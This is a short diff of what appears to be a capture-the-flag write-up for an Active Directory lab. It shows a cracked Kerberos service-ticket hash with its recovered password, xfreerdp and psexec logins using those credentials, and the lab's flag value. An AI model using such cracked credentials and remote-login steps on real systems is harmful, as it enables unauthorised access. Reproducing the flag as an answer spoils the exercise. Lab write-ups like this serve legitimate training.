@@ -189,16 +189,13 @@ $krb5tgs$HTTP/fela:c0a2cb48f3039e2...:rubenF124
 Then login with xfreerdp and on desktop is the file flag.txt:
 ```
 # xfreerdp /p:'rubenF124' /u:'corp\fela' /v:<targetIP>
-...
-Do you trust the above certificate? (Y/T/N) y
-...
 ```
 Before this tried psexec the access the file but does not work unless it admin account:
 ```
 psexec -u corp\fela -p password cmd
 ```
 
-flag is flag{bde1642535aa396d2439d86fe54a36e4}
+Answer: flag is on desktop, flag{bde1642535aa396d2439d86fe54a36e4}
 
 ---
 ## Task 4: Privilege Escalation
